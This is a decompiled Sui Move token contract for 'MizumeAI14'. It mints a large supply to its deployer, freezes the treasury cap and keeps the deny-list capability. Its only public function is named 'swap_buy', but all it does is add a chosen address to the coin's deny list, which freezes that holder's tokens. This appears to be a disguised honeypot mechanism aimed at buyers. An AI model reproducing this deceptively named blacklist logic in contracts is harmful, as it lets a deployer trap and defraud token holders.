module 0x44008615ac66be87527ef76dc26ddab458ca6cf2c424d82bd7e0202b6f62f77::mizumeai14 {
    struct MIZUMEAI14 has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: MIZUMEAI14, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<MIZUMEAI14>(arg0, 9, b"MizumeAI14", b"Mizume AI", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmZgQw2tpn12hDteMZ9KrZJg2kvLMSFZrd89N4MPJaPNvN"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<MIZUMEAI14>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<MIZUMEAI14>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<MIZUMEAI14>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<MIZUMEAI14>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<MIZUMEAI14>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<MIZUMEAI14>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

